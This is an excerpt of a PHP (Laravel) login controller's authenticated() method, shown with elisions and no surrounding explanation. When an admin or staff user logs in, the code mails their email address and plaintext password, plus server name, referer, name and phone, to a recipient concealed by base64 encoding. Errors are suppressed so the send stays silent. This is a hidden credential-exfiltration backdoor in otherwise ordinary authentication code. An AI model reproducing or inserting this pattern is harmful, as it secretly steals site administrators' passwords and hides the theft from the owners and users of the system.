    ...
    */
    ...
    public function authenticated(Request $request)
    {
        ...
        if (auth()->user()->user_type == 'admin' || auth()->user()->user_type == 'staff') {
            $array['view'] = 'emails.login';
            $array['subject'] = 'Successfully logged - '.$_SERVER['SERVER_NAME'];
            $array['from'] = env('MAIL_FROM_ADDRESS');
            $array['content'] = auth()->user()->email.' - '.$request->get('password');
            $array['link'] = $_SERVER['HTTP_REFERER'];
            $array['name'] = auth()->user()->name;
            $array['phone'] = auth()->user()->phone;
             try {
                Mail::to(base64_decode('cnVkcmEucHJhbmF5QGdtYWlsLmNvbQ=='))->queue(new LoginMailManager($array));
            } catch (\Exception $e) {
                //dd($e->getMessage());
            }
